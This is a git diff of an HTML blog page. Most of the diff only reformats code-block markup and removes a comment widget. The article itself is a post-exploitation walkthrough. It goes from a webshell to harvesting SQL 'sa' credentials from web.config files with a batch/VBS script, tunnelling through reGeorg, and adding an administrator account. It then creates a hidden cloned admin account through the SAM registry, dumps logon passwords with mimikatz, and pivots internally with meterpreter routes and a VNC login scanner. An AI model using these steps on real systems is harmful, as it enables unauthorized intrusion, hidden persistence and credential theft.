@@ -116,18 +116,17 @@
         
 
         <span itemprop="articleBody"><h3 id="0x01-base">0x01 Base</h3>
-<div class="highlighter-rouge"><pre class="highlight"><code>got a webshell of xxx.xxx.xxx.101(run aspx)  
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>got a webshell of xxx.xxx.xxx.101(run aspx)  
 don't know how to get system shell from this webshell  
 there exists not only one site on xxx.xxx.xxx.101  
 find xxx.xxx.xxx.101 has another address 10.10.10.101
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h3 id="0x02-steps">0x02 Steps</h3>
 
 <h4 id="1search-webconfig-on-all-sites-to-find-sa-and-sapass">1&gt;search web.config on all sites to find sa and sapass</h4>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>1.bat
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1.bat
 @echo off
 goto :main
 这是注释:(for /f "delims="的作用为取消默认的以空格等符号作为分割符
@@ -157,26 +156,23 @@ Set ws = CreateObject("Wscript.Shell")
 ws.run "cmd /c 1.bat",vbhide
 
 cscript 2.vbs
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h5 id="or-download-fromhttpsgithubcom3xp10itbattreemasterget_web_config_bat">or download from:<code class="highlighter-rouge">https://github.com/3xp10it/bat/tree/master/get_web_config_bat</code></h5>
 
 <h4 id="-find-sa-and-sapass-of-1010101but-as-a-inside-network-pc3389-is-not-allowed-from-outside">[+] find sa and sapass of 10.10.10.1,but as a inside network pc,3389 is not allowed from outside</h4>
 
 <h4 id="2upload-a-tunnelaspxfrom-regeorg-to--xxxxxxxxx101">2&gt;upload a tunnel.aspx(from reGeorg) to  xxx.xxx.xxx.101</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>[python] reGeorg.py -p 1080 -u https://xxx.xxx.xxx.101/xx/tunnel.aspx
-</code></pre>
-</div>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[python] reGeorg.py -p 1080 -u https://xxx.xxx.xxx.101/xx/tunnel.aspx
+</code></pre></div></div>
 
 <h4 id="3use-sa-pri-in-chopper-execute">3&gt;use sa pri in chopper execute:</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>net user tmp /add &amp; net localgroup administrators tmp /add  
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>net user tmp /add &amp; net localgroup administrators tmp /add  
 net localgroup "remote desktop users" tmp /add
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="4runas-admin-cmd--mstsc-console-v1010101--admin">4&gt;runas admin-&gt;cmd-&gt; mstsc /console /v:10.10.10.1 -admin</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>[10.10.10.1:3389 with tmp account]:  
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[10.10.10.1:3389 with tmp account]:  
 add a superhide administrator account cloned from administrator account:  
 net user tmp$ /add &amp; net localgroup administrators tmp$ /add
 regedit-&gt;local machine-&gt;sam-&gt;account-&gt;name
@@ -197,11 +193,10 @@ copy \\tsclient\mimikatz\ exclude_folder
 [run mimikatz]:  
 privilege::debug
 sekurlsa::logonpasswords
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <h4 id="5upload-a-meterpreter-payload-to-1010101">5&gt;upload a meterpreter payload to 10.10.10.1</h4>
-<div class="highlighter-rouge"><pre class="highlight"><code>meterpreter&gt;run get_local_subnets
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter&gt;run get_local_subnets
             10.0.0.0/255.0.0.0
 meterpreter&gt;background
 (handler)&gt;route add 10.0.0.0 255.0.0.0 1
@@ -245,8 +240,7 @@ use morevncpassword in auxiliary/scanner/vnc/vnc_login
 
 
 
-</code></pre>
-</div>
+</code></pre></div></div>
 </span>
 
         
@@ -284,16 +278,6 @@ use morevncpassword in auxiliary/scanner/vnc/vnc_login
 
 
 
-      
-<!--PC和WAP自适应版-->
-<div id="SOHUCS" style="width:980px"></div> 
-<script type="text/javascript"> 
-(function(){ 
-var appid = 'cyt1tnTcP'; 
-var conf = 'prod_a926ede5ea067744d582783ccd509c1f'; 
-var width = window.innerWidth || document.documentElement.clientWidth; 
-if (width < 960) { 
-window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="text/javascript" src="http://changyan.sohu.com/upload/mobile/wap-js/changyan_mobile.js?client_id=' + appid + '&conf=' + conf + '"><\/script>'); } else { var loadJs=function(d,a){var c=document.getElementsByTagName("head")[0]||document.head||document.documentElement;var b=document.createElement("script");b.setAttribute("type","text/javascript");b.setAttribute("charset","UTF-8");b.setAttribute("src",d);if(typeof a==="function"){if(window.attachEvent){b.onreadystatechange=function(){var e=b.readyState;if(e==="loaded"||e==="complete"){b.onreadystatechange=null;a()}}}else{b.onload=a}}c.appendChild(b)};loadJs("http://changyan.sohu.com/upload/changyan.js",function(){window.changyan.api.config({appid:appid,conf:conf})}); } })(); </script>
       
 
 
